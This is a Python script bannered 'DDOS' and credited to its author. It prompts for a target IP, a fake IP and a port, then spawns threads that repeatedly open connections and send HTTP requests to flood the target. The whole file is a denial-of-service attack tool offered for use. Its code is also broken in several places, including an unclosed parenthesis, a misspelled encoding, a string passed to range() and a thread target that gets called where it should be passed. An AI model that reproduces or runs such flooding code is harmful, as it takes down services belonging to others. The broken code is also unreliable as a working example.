import socket
import threading
import os,sys
from colorama import Fore,init
import time
import cowsay

init()
RESET=Fore.RESET

def banner():

    os.system("cls" or "clear")

    print(Fore.GREEN + """
    
    
    8 888888888o.      8 888888888o.          ,o888888o.        d888888o.   
    8 8888    `^888.   8 8888    `^888.    . 8888     `88.    .`8888:' `88. 
    8 8888        `88. 8 8888        `88. ,8 8888       `8b   8.`8888.   Y8 
    8 8888         `88 8 8888         `88 88 8888        `8b  `8.`8888.     
    8 8888          88 8 8888          88 88 8888         88   `8.`8888.    
    8 8888          88 8 8888          88 88 8888         88    `8.`8888.   
    8 8888         ,88 8 8888         ,88 88 8888        ,8P     `8.`8888.  
    8 8888        ,88' 8 8888        ,88' `8 8888       ,8P  8b   `8.`8888. 
    8 8888    ,o88P'   8 8888    ,o88P'    ` 8888     ,88'   `8b.  ;8.`8888 
    8 888888888P'      8 888888888P'          `8888888P'      `Y8888P ,88P' 
    
                    version : 1.0
                    Coded by Sir Ashkan-Farrokhi(Sir-Mrx)
                    I offer this code to my masters ==> Sir Mahdi and Sir Qadir.

    """+ RESET)


banner()

target=input(Fore.LIGHTCYAN_EX+"[+] Please Enter Target ip : \n"+RESET)
time.sleep(1)
fake_ip=input(Fore.LIGHTBLUE_EX+"[+] Please Enter Fake ip : \n"+RESET)
time.sleep(1)
port=int(input(Fore.LIGHTMAGENTA_EX+"[+] Please Enter Port Number : \n")+RESET)
time.sleep(1)
counter=0

def attack():
    while True:
        sok=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sok.connect((target,port)
        sok.sendto(("GET /"+target+"HTTP/1.1\r\n").encode("ascci"),(target,port))
        sok.sendto(("HOST:"+fake_ip+"\r\n\r\n").encode("ascci"),(target,port))

        global counter
        counter+=1
        str(counter)
        print(f"{Fore.BLUE} [+] Packet {counter} send !")
        sok.close()

print("[          ] 0%")
time.sleep(1)
print("[**        ] 20%")
time.sleep(1)
print("[****      ] 40%")
time.sleep(1)
print("[******    ] 60%")
time.sleep(1)
print("[********  ] 80%")
time.sleep(1)
print("[**********] 100%")
time.sleep(2)
cowsay.daemon("Attack Started ...")
time.sleep(1)

range_number=input("[+] Please Enter number of range to start attacking ...")
for numerator in range(range_number):
    thread=threading.Thread(target=attack())
    thread.start()




